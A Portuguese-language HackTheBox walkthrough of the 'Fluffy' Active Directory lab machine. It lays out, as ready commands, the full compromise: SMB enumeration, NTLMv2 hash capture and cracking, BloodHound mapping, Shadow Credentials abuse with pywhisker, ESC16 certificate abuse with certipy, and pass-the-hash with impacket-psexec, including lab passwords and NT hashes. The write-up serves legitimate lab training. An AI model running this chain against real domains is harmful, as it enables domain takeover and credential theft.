---
title: "Fluffy Machine - HTB (Windows | Easy)"
published: 2024-01-15
description: "Enumeração de Active Directory, captura de hash NTLMv2, e escalação de privilégios via AD CS (Shadow Credentials & ESC16)."
image: "https://miro.medium.com/1*wD7XFSq2w0I8Fa8hBbspug.png"
tags: ["hackthebox", "ctf", "walkthrough", "activedirectory", "windows", "adcs", "bloodhound", "pywhisker", "certipy", "shadowcredentials", "esc16"]
category: "HackTheBox"
draft: false
---

# Fluffy Machine - HTB (Windows | Easy)

:::note
**Resumo da Máquina**
- **IP:** `10.10.11.69`
- **SO:** Windows
- **Vetor de Ataque:** Enumeração de Active Directory, captura de hash NTLMv2, e escalação de privilégios via AD CS (Shadow Credentials & ESC16).
:::

**Tags:** `#activedirectory` `#windows` `#adcs` `#bloodhound` `#pywhisker` `#certipy` `#shadowcredentials` `#esc16`

## 👤 Credenciais Iniciais
- **Usuário:** `j.fleischman`
- **Senha:** `J0elTHEM4n1990!`

## 🛠️ Ferramentas Utilizadas
- nmap
- smbclient
- bloodhound
- pywhisker
- evil-winrm
- impacket
- hashcat
- ntpdate

## ⚠️ Erro: Clock skew too great
Um problema comum em ambientes AD é a dessincronização de horário entre a máquina atacante e o alvo. Isso pode ser corrigido com o comando:
```bash
ntpdate 10.10.11.69
```

## 🔎 Enumeração Inicial

### Scan com Nmap
```bash
nmap -T4 -p- -v -A -P0 10.10.11.69 -oX fluffy_tcp.scan --webxml
```

- **Domínio:** `FLUFFY.HTB`
- **Domain Controller (DC):** `DC01.FLUFFY.HTB`

## 📁 Enumeração SMB
Com as credenciais iniciais, listamos os compartilhamentos disponíveis no servidor.
```bash
smbclient -L //10.10.11.69 -U j.fleischman --password='J0elTHEM4n1990!'
```

**Shares encontrados:**
`ADMIN$`, `C$`, `IPC$`, `IT`, `NETLOGON`, `SYSVOL`

O share `IT` parece promissor. Vamos acessá-lo:
```bash
smbclient //10.10.11.69/IT -U j.fleischman --password='J0elTHEM4n1990!'
```

**Arquivos encontrados no share:**
- `Everything-1.4.1.1026.x64/`
- `Everything-1.4.1.1026.x64.zip`
- `KeePass-2.58/`
- `KeePass-2.58.zip`
- `Upgrade_Notice.pdf` ← **Arquivo chave!**

## 📝 Análise do PDF e Captura de Hash
O arquivo `Upgrade_Notice.pdf` menciona várias CVEs, com destaque para a **CVE-2025-24071**. Esta vulnerabilidade permite a captura de hashes NTLMv2 ao forçar uma autenticação contra um listener SMB malicioso.

Após explorar a falha, o hash do usuário **p.agila** foi capturado.

## 🔐 Cracking NTLMv2 com Hashcat
O hash capturado foi quebrado com sucesso, revelando a seguinte credencial:
- **Usuário:** `p.agila`
- **Senha:** `prometheusx-303`

## 🧠 Análise com BloodHound
```bash
bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69
```

A análise do BloodHound revelou um caminho de privilégio interessante:
- `p.agila` ∈ `SERVICE ACCOUNT MANAGERS`
- `SERVICE ACCOUNT MANAGERS` → `GenericAll` → `SERVICE ACCOUNTS`
- `SERVICE ACCOUNTS` → `GenericWrite` → `ca_svc`, `ldap_svc`, `winrm_svc`

Isso significa que `p.agila` pode se adicionar ao grupo "SERVICE ACCOUNTS" e então modificar as contas de serviço.

### Adicionando p.agila ao Grupo
```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB/p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

## 🧙 Abuso de Shadow Credentials (pywhisker)
Com as novas permissões, podemos usar `pywhisker` para adicionar credenciais alternativas (Shadow Credentials) à conta de serviço `winrm_svc` e nos autenticar como ela.

```bash
pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
```

```bash
gettgtpkinit -cert-pem oBwGyENT_cert.pem -key-pem oBwGyENT_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
export KRB5CCNAME=winrm_svc.ccache
```

## 📡 Acesso Inicial com Evil-WinRM
Agora, com um TGT para `winrm_svc`, podemos obter seu hash NT e usar Evil-WinRM para ganhar um shell.

```bash
getnthash -key <key> fluffy.htb/winrm_svc
evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

**USER FLAG PWNED 🎉**

## 🔐 Escalada de Privilégio (ESC16 via Certipy)

:::warning
É crucial usar uma versão atualizada do Certipy, clonada diretamente do GitHub, para que a vulnerabilidade ESC16 funcione corretamente.
:::

A mesma permissão de `GenericWrite` sobre contas de serviço se aplica a `ca_svc`. Vamos explorar isso para escalar privilégios para Administrador.

### 1. Obter Hash NT de ca_svc
```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
```
Hash NT obtido: `ca0f4f9e9eb8a092addf53bb03fc98c8`

### 2. Verificar Vulnerabilidade ESC16
```bash
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout
```

### 3. Alterar UPN de 'ca_svc' para 'Administrator'
Alteramos o User Principal Name (UPN) da conta de serviço para o do Administrador para podermos requisitar um certificado em seu nome.
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
```

### 4. Requisitar Certificado como Administrator
```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User' -upn 'administrator@fluffy.htb'
```

### 5. Reverter UPN (Boa prática)
```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

### 6. Autenticar com o Certificado e Obter Hash de Admin
```bash
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```
Hash NT do Administrador: `8da83a3fa618b6e3a00e93f676c92a6e`

## 💣 Execução Final: Pass-the-Hash
Com o hash NT do Administrador, usamos `psexec.py` do Impacket para obter um shell como SYSTEM.

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69
```

**SYSTEM FLAG PWNED 👑**
